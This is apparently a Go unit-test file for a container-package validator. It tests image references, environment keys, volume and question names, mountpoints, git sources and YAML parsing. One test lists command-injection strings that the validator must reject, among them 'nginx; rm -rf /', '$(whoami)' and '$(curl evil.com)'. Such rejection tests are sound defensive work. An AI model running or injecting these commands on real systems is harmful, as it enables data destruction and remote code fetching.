package packages

import (
	"errors"
	"strings"
	"testing"

	"go.yaml.in/yaml/v4"
)

func TestNormalizeImageURL(t *testing.T) {
	tests := map[string]struct {
		input string
		want  string
	}{
		"single name no tag":                {"nginx", "docker.io/library/nginx:latest"},
		"single name with tag":              {"nginx:1.25", "docker.io/library/nginx:1.25"},
		"single name with latest":           {"nginx:latest", "docker.io/library/nginx:latest"},
		"two components no tag":             {"myuser/myapp", "docker.io/myuser/myapp:latest"},
		"two components with tag":           {"myuser/myapp:v2", "docker.io/myuser/myapp:v2"},
		"full url no tag":                   {"ghcr.io/user/app", "ghcr.io/user/app:latest"},
		"full url with tag":                 {"ghcr.io/user/app:v1", "ghcr.io/user/app:v1"},
		"full url with digest":              {"ghcr.io/user/app:sha256", "ghcr.io/user/app:sha256"},
		"docker hub explicit no tag":        {"docker.io/library/nginx", "docker.io/library/nginx:latest"},
		"docker hub explicit with tag":      {"docker.io/library/nginx:alpine", "docker.io/library/nginx:alpine"},
		"registry with port no tag":         {"registry.example.com/myapp", "registry.example.com/myapp:latest"},
		"registry with port with tag":       {"registry.example.com/myapp:v1", "registry.example.com/myapp:v1"},
		"deep path":                         {"ghcr.io/org/sub/image", "ghcr.io/org/sub/image:latest"},
		"deep path with tag":                {"ghcr.io/org/sub/image:v3", "ghcr.io/org/sub/image:v3"},
		"empty string":                      {"", ""},
		"alpine":                            {"alpine", "docker.io/library/alpine:latest"},
		"redis with alpine tag":             {"redis:7.0-alpine", "docker.io/library/redis:7.0-alpine"},
		"quay registry":                     {"quay.io/prometheus/node-exporter:v1.5.0", "quay.io/prometheus/node-exporter:v1.5.0"},
		"localhost namespace":               {"localhost/myimage", "docker.io/localhost/myimage:latest"},
	}

	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			got := NormalizeImageURL(tt.input)
			if got != tt.want {
				t.Fatalf("NormalizeImageURL(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestValidateImageURL(t *testing.T) {
	t.Run("valid", func(t *testing.T) {
		err := ValidateImageURL("nginx:latest")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})
	t.Run("empty", func(t *testing.T) {
		err := ValidateImageURL("")
		if err == nil {
			t.Fatal("expected error for empty image")
		}
		if !errors.Is(err, ErrInvalidImage) {
			t.Fatalf("expected ErrInvalidImage, got %v", err)
		}
	})

	validRefs := []string{
		"nginx",
		"nginx:latest",
		"ghcr.io/user/app:v1",
		"docker.io/library/nginx:alpine",
		"registry.example.com/org/image:sha256",
		"debian:@tag@",
		"myuser/myapp",
		"quay.io/prometheus/node-exporter:v1.5.0",
		"redis:7.0-alpine",
	}
	for _, ref := range validRefs {
		t.Run("valid_format/"+ref, func(t *testing.T) {
			if err := ValidateImageURL(ref); err != nil {
				t.Fatalf("expected %q to be valid: %v", ref, err)
			}
		})
	}

	invalidRefs := []string{
		"nginx; rm -rf /",
		"image$(whoami)",
		"image`id`",
		"bad image",
		"image\ttab",
		"nginx:latest\nnewline",
		"$(curl evil.com)",
		";evil",
	}
	for _, ref := range invalidRefs {
		label := strings.ReplaceAll(ref, "\n", "\\n")
		label = strings.ReplaceAll(label, "\t", "\\t")
		t.Run("invalid_format/"+label, func(t *testing.T) {
			err := ValidateImageURL(ref)
			if err == nil {
				t.Fatalf("expected %q to be invalid", ref)
			}
			if !errors.Is(err, ErrInvalidImage) {
				t.Fatalf("expected ErrInvalidImage, got %v", err)
			}
		})
	}
}

func TestValidateEnvironmentKey(t *testing.T) {
	valid := []string{"PATH", "HOME", "NGINX_HOST", "a", "_private", "_A1", "lower_case"}
	for _, key := range valid {
		t.Run("valid/"+key, func(t *testing.T) {
			err := ValidateEnvironmentKey(key)
			if err != nil {
				t.Fatalf("expected %q to be valid: %v", key, err)
			}
		})
	}

	invalid := []string{
		"",
		"1BAD",
		"-DASH",
		"HAS SPACE",
		"has.dot",
		"has-dash",
		"bad!",
		"foo=bar",
	}
	for _, key := range invalid {
		name := key
		if name == "" {
			name = "empty"
		}
		t.Run("invalid/"+name, func(t *testing.T) {
			err := ValidateEnvironmentKey(key)
			if err == nil {
				t.Fatalf("expected %q to be invalid", key)
			}
			if !errors.Is(err, ErrInvalidEnvironmentKey) {
				t.Fatalf("expected ErrInvalidEnvironmentKey, got %v", err)
			}
		})
	}
}

func TestValidateQuestionName(t *testing.T) {
	valid := []string{"hostname", "port", "password", "myVar123", "abc", "A", "x1"}
	for _, name := range valid {
		t.Run("valid/"+name, func(t *testing.T) {
			err := ValidateQuestionName(name)
			if err != nil {
				t.Fatalf("expected %q to be valid: %v", name, err)
			}
		})
	}

	invalid := []string{
		"",
		"has-dash",
		"has_underscore",
		"has space",
		"has.dot",
		"has@at",
		"123!",
	}
	for _, name := range invalid {
		label := name
		if label == "" {
			label = "empty"
		}
		t.Run("invalid/"+label, func(t *testing.T) {
			err := ValidateQuestionName(name)
			if err == nil {
				t.Fatalf("expected %q to be invalid", name)
			}
			if !errors.Is(err, ErrInvalidQuestionName) {
				t.Fatalf("expected ErrInvalidQuestionName, got %v", err)
			}
		})
	}
}

func TestValidateMountpoint(t *testing.T) {
	valid := []string{"/", "/data", "/usr/share/nginx/html", "/mnt/mydata"}
	for _, mp := range valid {
		t.Run("valid/"+mp, func(t *testing.T) {
			err := ValidateMountpoint(mp)
			if err != nil {
				t.Fatalf("expected %q to be valid: %v", mp, err)
			}
		})
	}

	invalid := []string{"", "relative/path", "data", "./relative", "../parent"}
	for _, mp := range invalid {
		label := mp
		if label == "" {
			label = "empty"
		}
		t.Run("invalid/"+label, func(t *testing.T) {
			err := ValidateMountpoint(mp)
			if err == nil {
				t.Fatalf("expected %q to be invalid", mp)
			}
			if !errors.Is(err, ErrInvalidMountpoint) {
				t.Fatalf("expected ErrInvalidMountpoint, got %v", err)
			}
		})
	}
}

func TestValidateVolumeName(t *testing.T) {
	valid := []string{"data", "my-volume", "my_volume", "Volume1", "a123", "config.d"}
	for _, name := range valid {
		t.Run("valid/"+name, func(t *testing.T) {
			err := ValidateVolumeName(name)
			if err != nil {
				t.Fatalf("expected %q to be valid: %v", name, err)
			}
		})
	}

	invalid := []string{"", "-start", ".hidden", "_start", "has space", "bad!", "slashes/bad"}
	for _, name := range invalid {
		label := name
		if label == "" {
			label = "empty"
		}
		t.Run("invalid/"+label, func(t *testing.T) {
			err := ValidateVolumeName(name)
			if err == nil {
				t.Fatalf("expected %q to be invalid", name)
			}
			if !errors.Is(err, ErrInvalidVolumeName) {
				t.Fatalf("expected ErrInvalidVolumeName, got %v", err)
			}
		})
	}
}

func TestValidateArchiveSpec(t *testing.T) {
	volumes := map[string]InputPackageVolume{
		"data": {Mountpoint: "/data"},
	}

	t.Run("valid spec", func(t *testing.T) {
		spec := InputPackageArchive{Image: "nginx:latest", Directory: "/usr/share/nginx/html", Volume: "data"}
		if err := ValidateArchiveSpec(spec, volumes); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("missing image", func(t *testing.T) {
		spec := InputPackageArchive{Image: "", Directory: "/data", Volume: "data"}
		err := ValidateArchiveSpec(spec, volumes)
		if err == nil {
			t.Fatal("expected error for missing image")
		}
		if !errors.Is(err, ErrInvalidArchiveSpec) {
			t.Fatalf("expected ErrInvalidArchiveSpec, got %v", err)
		}
	})

	t.Run("non-absolute directory", func(t *testing.T) {
		spec := InputPackageArchive{Image: "nginx:latest", Directory: "relative/path", Volume: "data"}
		err := ValidateArchiveSpec(spec, volumes)
		if err == nil {
			t.Fatal("expected error for non-absolute directory")
		}
		if !errors.Is(err, ErrInvalidArchiveSpec) {
			t.Fatalf("expected ErrInvalidArchiveSpec, got %v", err)
		}
	})

	t.Run("unknown volume", func(t *testing.T) {
		spec := InputPackageArchive{Image: "nginx:latest", Directory: "/data", Volume: "nonexistent"}
		err := ValidateArchiveSpec(spec, volumes)
		if err == nil {
			t.Fatal("expected error for unknown volume")
		}
		if !errors.Is(err, ErrInvalidArchiveSpec) {
			t.Fatalf("expected ErrInvalidArchiveSpec, got %v", err)
		}
	})
}

func TestValidateGitURL(t *testing.T) {
	t.Run("valid HTTPS URL", func(t *testing.T) {
		err := ValidateGitURL("https://github.com/example/repo.git")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("empty string accepted", func(t *testing.T) {
		err := ValidateGitURL("")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("missing scheme rejected", func(t *testing.T) {
		err := ValidateGitURL("github.com/example/repo.git")
		if err == nil {
			t.Fatal("expected error for missing scheme")
		}
		if !errors.Is(err, ErrInvalidGitURL) {
			t.Fatalf("expected ErrInvalidGitURL, got %v", err)
		}
	})

	t.Run("bare string rejected", func(t *testing.T) {
		err := ValidateGitURL("not-a-url")
		if err == nil {
			t.Fatal("expected error for bare string")
		}
		if !errors.Is(err, ErrInvalidGitURL) {
			t.Fatalf("expected ErrInvalidGitURL, got %v", err)
		}
	})

	t.Run("file URL accepted", func(t *testing.T) {
		err := ValidateGitURL("file:///tmp/repo.git")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("file URL without host accepted", func(t *testing.T) {
		err := ValidateGitURL("file:///home/user/repo")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("SSH URL accepted", func(t *testing.T) {
		err := ValidateGitURL("ssh://git@github.com/example/repo.git")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("HTTP URL accepted", func(t *testing.T) {
		err := ValidateGitURL("http://github.com/example/repo.git")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("HTTPS with credentials accepted", func(t *testing.T) {
		err := ValidateGitURL("https://user:pass@github.com/example/repo.git")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("scheme only rejected", func(t *testing.T) {
		err := ValidateGitURL("https://")
		if err == nil {
			t.Fatal("expected error for scheme-only URL")
		}
		if !errors.Is(err, ErrInvalidGitURL) {
			t.Fatalf("expected ErrInvalidGitURL, got %v", err)
		}
	})

	t.Run("non-file scheme without host rejected", func(t *testing.T) {
		err := ValidateGitURL("https:///no-host-repo")
		if err == nil {
			t.Fatal("expected error for https URL without host")
		}
		if !errors.Is(err, ErrInvalidGitURL) {
			t.Fatalf("expected ErrInvalidGitURL, got %v", err)
		}
	})
}

func TestValidateDoesNotCheckGitURLs(t *testing.T) {
	// Validate() does not check git URLs — that happens in Compile().
	// This verifies the boundary: invalid git URL passes Validate but fails Compile.
	pkg := InputPackage{
		Image:       InputPackageImage{URL: "nginx"},
		Environment: map[string]string{},
		Network:     InputPackageNetwork{},
		Volumes:     map[string]InputPackageVolume{"config": {Mountpoint: "/config", Git: "not-a-url"}},
		Questions:   map[string]Question{},
	}
	err := pkg.Validate()
	if err != nil {
		t.Fatalf("Validate should accept invalid git URL, got: %v", err)
	}

	_, err = pkg.Compile(Responses{})
	if err == nil {
		t.Fatal("Compile should reject invalid git URL")
	}
	if !errors.Is(err, ErrInvalidGitURL) {
		t.Fatalf("expected ErrInvalidGitURL, got %v", err)
	}
}

func TestYAMLVolumeGitParsing(t *testing.T) {
	t.Run("YAML with git field", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external: {}
  internal: {}
volumes:
  config:
    mountpoint: /config
    git: https://github.com/example/config.git
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Volumes["config"].Git != "https://github.com/example/config.git" {
			t.Fatalf("expected git URL, got %q", pkg.Volumes["config"].Git)
		}
	})

	t.Run("YAML without git field", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external: {}
  internal: {}
volumes:
  data:
    mountpoint: /data
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Volumes["data"].Git != "" {
			t.Fatalf("expected empty git, got %q", pkg.Volumes["data"].Git)
		}
	})

	t.Run("compile from YAML with git", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external: {}
  internal: {}
volumes:
  config:
    mountpoint: /config
    git: https://github.com/example/config.git
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		compiled, err := pkg.Compile(Responses{})
		if err != nil {
			t.Fatalf("unexpected compile error: %v", err)
		}
		if compiled.Volumes["config"].Git != "https://github.com/example/config.git" {
			t.Fatalf("expected git URL in compiled output, got %q", compiled.Volumes["config"].Git)
		}
	})
}

func TestCompileNormalizesImage(t *testing.T) {
	tests := map[string]struct {
		image string
		want  string
	}{
		"single name":     {"nginx", "docker.io/library/nginx:latest"},
		"two components":  {"myuser/myapp", "docker.io/myuser/myapp:latest"},
		"full with tag":   {"ghcr.io/user/app:v1", "ghcr.io/user/app:v1"},
		"already full":    {"docker.io/library/nginx:latest", "docker.io/library/nginx:latest"},
	}

	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			input := InputPackage{
				Image:       InputPackageImage{URL: tt.image},
				Environment: map[string]string{},
				Network:     InputPackageNetwork{},
				Volumes:     map[string]InputPackageVolume{},
				Questions:   map[string]Question{},
			}
			p, err := input.Compile(Responses{})
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if p.Image != tt.want {
				t.Fatalf("expected %q, got %q", tt.want, p.Image)
			}
		})
	}
}

func TestCompileRejectsInvalidQuestionName(t *testing.T) {
	input := InputPackage{
		Image:       InputPackageImage{URL: "nginx"},
		Environment: map[string]string{},
		Network:     InputPackageNetwork{},
		Volumes:     map[string]InputPackageVolume{},
		Questions:   map[string]Question{"bad-name": {Query: "test?"}},
	}
	_, err := input.Compile(Responses{})
	if err == nil {
		t.Fatal("expected error for invalid question name")
	}
	if !errors.Is(err, ErrInvalidQuestionName) {
		t.Fatalf("expected ErrInvalidQuestionName, got %v", err)
	}
}

func TestCompileRejectsInvalidEnvironmentKey(t *testing.T) {
	input := InputPackage{
		Image:       InputPackageImage{URL: "nginx"},
		Environment: map[string]string{"1BAD": "value"},
		Network:     InputPackageNetwork{},
		Volumes:     map[string]InputPackageVolume{},
		Questions:   map[string]Question{},
	}
	_, err := input.Compile(Responses{})
	if err == nil {
		t.Fatal("expected error for invalid environment key")
	}
	if !errors.Is(err, ErrInvalidEnvironmentKey) {
		t.Fatalf("expected ErrInvalidEnvironmentKey, got %v", err)
	}
}

func TestCompileRejectsInvalidVolumeName(t *testing.T) {
	input := InputPackage{
		Image:       InputPackageImage{URL: "nginx"},
		Environment: map[string]string{},
		Network:     InputPackageNetwork{},
		Volumes:     map[string]InputPackageVolume{"bad name!": {Mountpoint: "/data"}},
		Questions:   map[string]Question{},
	}
	_, err := input.Compile(Responses{})
	if err == nil {
		t.Fatal("expected error for invalid volume name")
	}
	if !errors.Is(err, ErrInvalidVolumeName) {
		t.Fatalf("expected ErrInvalidVolumeName, got %v", err)
	}
}

func TestCompileRejectsInvalidMountpoint(t *testing.T) {
	input := InputPackage{
		Image:       InputPackageImage{URL: "nginx"},
		Environment: map[string]string{},
		Network:     InputPackageNetwork{},
		Volumes:     map[string]InputPackageVolume{"data": {Mountpoint: "relative/path"}},
		Questions:   map[string]Question{},
	}
	_, err := input.Compile(Responses{})
	if err == nil {
		t.Fatal("expected error for relative mountpoint")
	}
	if !errors.Is(err, ErrInvalidMountpoint) {
		t.Fatalf("expected ErrInvalidMountpoint, got %v", err)
	}
}

func TestCompileRejectsEmptyImage(t *testing.T) {
	input := InputPackage{
		Image:       InputPackageImage{URL: ""},
		Environment: map[string]string{},
		Network:     InputPackageNetwork{},
		Volumes:     map[string]InputPackageVolume{},
		Questions:   map[string]Question{},
	}
	_, err := input.Compile(Responses{})
	if err == nil {
		t.Fatal("expected error for empty image")
	}
	if !errors.Is(err, ErrNoRuntime) {
		t.Fatalf("expected ErrNoRuntime, got %v", err)
	}
}

func TestCompileAcceptsTemplateMountpoint(t *testing.T) {
	// Template variables in mountpoints should be accepted during Validate(),
	// then validated after substitution.
	input := InputPackage{
		Image:       InputPackageImage{URL: "nginx"},
		Environment: map[string]string{},
		Network:     InputPackageNetwork{},
		Volumes:     map[string]InputPackageVolume{"data": {Mountpoint: "/@path@/files"}},
		Questions:   map[string]Question{"path": {Query: "Mount path?"}},
	}
	p, err := input.Compile(Responses{"path": "mnt"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if p.Volumes["data"].Mountpoint != "/mnt/files" {
		t.Fatalf("expected /mnt/files, got %s", p.Volumes["data"].Mountpoint)
	}
}

func TestCompileRejectsTemplatedMountpointThatResolvesToRelative(t *testing.T) {
	// If a template resolves such that the mountpoint no longer starts with /,
	// it should be rejected.
	input := InputPackage{
		Image:       InputPackageImage{URL: "nginx"},
		Environment: map[string]string{},
		Network:     InputPackageNetwork{},
		Volumes:     map[string]InputPackageVolume{"data": {Mountpoint: "@path@/files"}},
		Questions:   map[string]Question{"path": {Query: "Mount path?"}},
	}
	_, err := input.Compile(Responses{"path": "relative"})
	if err == nil {
		t.Fatal("expected error for mountpoint that resolves to relative path")
	}
}

// TestYAMLIntegerParsing verifies that YAML integer values are correctly
// unmarshaled into map[string]string fields (environment, network ports).
func TestYAMLIntegerParsing(t *testing.T) {
	t.Run("environment integer value", func(t *testing.T) {
		input := `
image: nginx
environment:
  SOME_PORT: 8080
  WORKERS: 4
network:
  external: {}
  internal: {}
volumes: {}
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Environment["SOME_PORT"] != "8080" {
			t.Fatalf("expected SOME_PORT=8080, got %q", pkg.Environment["SOME_PORT"])
		}
		if pkg.Environment["WORKERS"] != "4" {
			t.Fatalf("expected WORKERS=4, got %q", pkg.Environment["WORKERS"])
		}
	})

	t.Run("network port integer keys and values", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external:
    80: 8080
  internal:
    6379: 6379
volumes: {}
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Network.External["80"] != "8080" {
			t.Fatalf("expected external[80]=8080, got %q", pkg.Network.External["80"])
		}
		if pkg.Network.Internal["6379"] != "6379" {
			t.Fatalf("expected internal[6379]=6379, got %q", pkg.Network.Internal["6379"])
		}
	})

	t.Run("boolean YAML values in environment", func(t *testing.T) {
		input := `
image: nginx
environment:
  DEBUG: true
  VERBOSE: false
network:
  external: {}
  internal: {}
volumes: {}
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Environment["DEBUG"] != "true" {
			t.Fatalf("expected DEBUG=true, got %q", pkg.Environment["DEBUG"])
		}
		if pkg.Environment["VERBOSE"] != "false" {
			t.Fatalf("expected VERBOSE=false, got %q", pkg.Environment["VERBOSE"])
		}
	})

	t.Run("float YAML value in environment", func(t *testing.T) {
		input := `
image: nginx
environment:
  RATIO: 3.14
network:
  external: {}
  internal: {}
volumes: {}
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Environment["RATIO"] != "3.14" {
			t.Fatalf("expected RATIO=3.14, got %q", pkg.Environment["RATIO"])
		}
	})

	t.Run("compile with integer environment values", func(t *testing.T) {
		input := `
image: nginx
environment:
  WORKERS: 4
  PORT: 8080
network:
  external:
    80: 80
  internal: {}
volumes: {}
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		compiled, err := pkg.Compile(Responses{})
		if err != nil {
			t.Fatalf("unexpected compile error: %v", err)
		}
		if compiled.Environment["WORKERS"] != "4" {
			t.Fatalf("expected WORKERS=4, got %q", compiled.Environment["WORKERS"])
		}
		if compiled.Environment["PORT"] != "8080" {
			t.Fatalf("expected PORT=8080, got %q", compiled.Environment["PORT"])
		}
	})
}

func TestValidateInputPackage(t *testing.T) {
	t.Run("valid package", func(t *testing.T) {
		pkg := InputPackage{
			Image:       InputPackageImage{URL: "nginx:latest"},
			Environment: map[string]string{"NGINX_HOST": "localhost"},
			Network:     InputPackageNetwork{},
			Volumes:     map[string]InputPackageVolume{"data": {Mountpoint: "/data"}},
			Questions:   map[string]Question{"hostname": {Query: "hostname?", Type: Hostname}},
		}
		err := pkg.Validate()
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("empty package minimal", func(t *testing.T) {
		pkg := InputPackage{
			Image:       InputPackageImage{URL: "alpine"},
			Environment: map[string]string{},
			Network:     InputPackageNetwork{},
			Volumes:     map[string]InputPackageVolume{},
			Questions:   map[string]Question{},
		}
		err := pkg.Validate()
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("template in mountpoint skips mountpoint validation", func(t *testing.T) {
		pkg := InputPackage{
			Image:       InputPackageImage{URL: "nginx"},
			Environment: map[string]string{},
			Network:     InputPackageNetwork{},
			Volumes:     map[string]InputPackageVolume{"data": {Mountpoint: "@prefix@/data"}},
			Questions:   map[string]Question{"prefix": {Query: "prefix?"}},
		}
		err := pkg.Validate()
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("rejects empty image", func(t *testing.T) {
		pkg := InputPackage{
			Image:       InputPackageImage{URL: ""},
			Environment: map[string]string{},
			Network:     InputPackageNetwork{},
			Volumes:     map[string]InputPackageVolume{},
			Questions:   map[string]Question{},
		}
		err := pkg.Validate()
		if !errors.Is(err, ErrNoRuntime) {
			t.Fatalf("expected ErrNoRuntime, got %v", err)
		}
	})

	t.Run("rejects invalid environment key", func(t *testing.T) {
		pkg := InputPackage{
			Image:       InputPackageImage{URL: "nginx"},
			Environment: map[string]string{"bad-key": "val"},
			Network:     InputPackageNetwork{},
			Volumes:     map[string]InputPackageVolume{},
			Questions:   map[string]Question{},
		}
		err := pkg.Validate()
		if !errors.Is(err, ErrInvalidEnvironmentKey) {
			t.Fatalf("expected ErrInvalidEnvironmentKey, got %v", err)
		}
	})

	t.Run("rejects invalid question name", func(t *testing.T) {
		pkg := InputPackage{
			Image:       InputPackageImage{URL: "nginx"},
			Environment: map[string]string{},
			Network:     InputPackageNetwork{},
			Volumes:     map[string]InputPackageVolume{},
			Questions:   map[string]Question{"bad_name": {Query: "test?"}},
		}
		err := pkg.Validate()
		if !errors.Is(err, ErrInvalidQuestionName) {
			t.Fatalf("expected ErrInvalidQuestionName, got %v", err)
		}
	})

	t.Run("rejects invalid volume name", func(t *testing.T) {
		pkg := InputPackage{
			Image:       InputPackageImage{URL: "nginx"},
			Environment: map[string]string{},
			Network:     InputPackageNetwork{},
			Volumes:     map[string]InputPackageVolume{".hidden": {Mountpoint: "/data"}},
			Questions:   map[string]Question{},
		}
		err := pkg.Validate()
		if !errors.Is(err, ErrInvalidVolumeName) {
			t.Fatalf("expected ErrInvalidVolumeName, got %v", err)
		}
	})

	t.Run("rejects invalid mountpoint", func(t *testing.T) {
		pkg := InputPackage{
			Image:       InputPackageImage{URL: "nginx"},
			Environment: map[string]string{},
			Network:     InputPackageNetwork{},
			Volumes:     map[string]InputPackageVolume{"data": {Mountpoint: "no-slash"}},
			Questions:   map[string]Question{},
		}
		err := pkg.Validate()
		if !errors.Is(err, ErrInvalidMountpoint) {
			t.Fatalf("expected ErrInvalidMountpoint, got %v", err)
		}
	})
}

func TestCompileDoesNotTemplateImage(t *testing.T) {
	input := InputPackage{
		Image:       InputPackageImage{URL: "debian:@tag@"},
		Environment: map[string]string{"TAG": "@tag@"},
		Network:     InputPackageNetwork{},
		Volumes:     map[string]InputPackageVolume{},
		Questions:   map[string]Question{"tag": {Query: "Tag?"}},
	}
	p, err := input.Compile(Responses{"tag": "latest"})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Image should NOT be substituted — template chars are literal.
	if p.Image != "docker.io/library/debian:@tag@" {
		t.Fatalf("expected docker.io/library/debian:@tag@, got %s", p.Image)
	}
	// Environment SHOULD be substituted.
	if p.Environment["TAG"] != "latest" {
		t.Fatalf("expected TAG=latest, got %s", p.Environment["TAG"])
	}
}

func TestValidateImageURLAcceptsTemplateChars(t *testing.T) {
	err := ValidateImageURL("debian:@tag@")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateGitSource(t *testing.T) {
	volumes := map[string]InputPackageVolume{
		"site": {Mountpoint: "/var/www/html"},
	}

	t.Run("valid git source", func(t *testing.T) {
		gs := InputPackageGitSource{URL: "https://example.com/repo.git", Branch: "main", Volume: "site"}
		if err := ValidateGitSource(gs, volumes); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("missing URL", func(t *testing.T) {
		gs := InputPackageGitSource{URL: "", Branch: "main", Volume: "site"}
		err := ValidateGitSource(gs, volumes)
		if err == nil {
			t.Fatal("expected error for missing URL")
		}
		if !errors.Is(err, ErrInvalidGitSource) {
			t.Fatalf("expected ErrInvalidGitSource, got %v", err)
		}
	})

	t.Run("missing volume", func(t *testing.T) {
		gs := InputPackageGitSource{URL: "https://example.com/repo.git", Branch: "main", Volume: ""}
		err := ValidateGitSource(gs, volumes)
		if err == nil {
			t.Fatal("expected error for missing volume")
		}
		if !errors.Is(err, ErrInvalidGitSource) {
			t.Fatalf("expected ErrInvalidGitSource, got %v", err)
		}
	})

	t.Run("volume not found", func(t *testing.T) {
		gs := InputPackageGitSource{URL: "https://example.com/repo.git", Branch: "main", Volume: "nonexistent"}
		err := ValidateGitSource(gs, volumes)
		if err == nil {
			t.Fatal("expected error for volume not found")
		}
		if !errors.Is(err, ErrInvalidGitSource) {
			t.Fatalf("expected ErrInvalidGitSource, got %v", err)
		}
	})

	t.Run("volume with template chars skips lookup", func(t *testing.T) {
		gs := InputPackageGitSource{URL: "https://example.com/repo.git", Branch: "main", Volume: "@volname@"}
		if err := ValidateGitSource(gs, volumes); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})
}

func TestCompileWithGitSources(t *testing.T) {
	t.Run("template substitution in URL and branch", func(t *testing.T) {
		input := InputPackage{
			Image:       InputPackageImage{URL: "nginx"},
			Environment: map[string]string{},
			Network:     InputPackageNetwork{},
			Volumes:     map[string]InputPackageVolume{"site": {Mountpoint: "/var/www/html"}},
			Questions:   map[string]Question{"repo": {Query: "Repo URL?"}, "branch": {Query: "Branch?"}},
			GitSources:  []InputPackageGitSource{{URL: "@repo@", Branch: "@branch@", Volume: "site"}},
		}
		_, err := input.Compile(Responses{"repo": "https://github.com/user/site.git", "branch": "production"})
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		// After Compile, iterateFields has mutated the GitSources in place.
		if input.GitSources[0].URL != "https://github.com/user/site.git" {
			t.Fatalf("expected URL to be substituted, got %q", input.GitSources[0].URL)
		}
		if input.GitSources[0].Branch != "production" {
			t.Fatalf("expected branch to be substituted, got %q", input.GitSources[0].Branch)
		}
	})

	t.Run("validates volume reference", func(t *testing.T) {
		input := InputPackage{
			Image:       InputPackageImage{URL: "nginx"},
			Environment: map[string]string{},
			Network:     InputPackageNetwork{},
			Volumes:     map[string]InputPackageVolume{},
			Questions:   map[string]Question{},
			GitSources:  []InputPackageGitSource{{URL: "https://example.com/repo.git", Branch: "main", Volume: "missing"}},
		}
		_, err := input.Compile(Responses{})
		if err == nil {
			t.Fatal("expected error for git_source referencing missing volume")
		}
		if !errors.Is(err, ErrInvalidGitSource) {
			t.Fatalf("expected ErrInvalidGitSource, got %v", err)
		}
	})
}

func TestYAMLVolumeQuotaParsing(t *testing.T) {
	t.Run("string quota", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external: {}
  internal: {}
volumes:
  data:
    mountpoint: /data
    quota: 1gb
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Volumes["data"].Quota != "1gb" {
			t.Fatalf("expected quota 1gb, got %q", pkg.Volumes["data"].Quota)
		}
		if pkg.Volumes["data"].Mountpoint != "/data" {
			t.Fatalf("expected mountpoint /data, got %q", pkg.Volumes["data"].Mountpoint)
		}
	})

	t.Run("integer quota in YAML", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external: {}
  internal: {}
volumes:
  data:
    mountpoint: /data
    quota: 1073741824
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Volumes["data"].Quota != "1073741824" {
			t.Fatalf("expected quota 1073741824, got %q", pkg.Volumes["data"].Quota)
		}
	})

	t.Run("no quota omitted", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external: {}
  internal: {}
volumes:
  data:
    mountpoint: /data
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Volumes["data"].Quota != "" {
			t.Fatalf("expected empty quota, got %q", pkg.Volumes["data"].Quota)
		}
	})

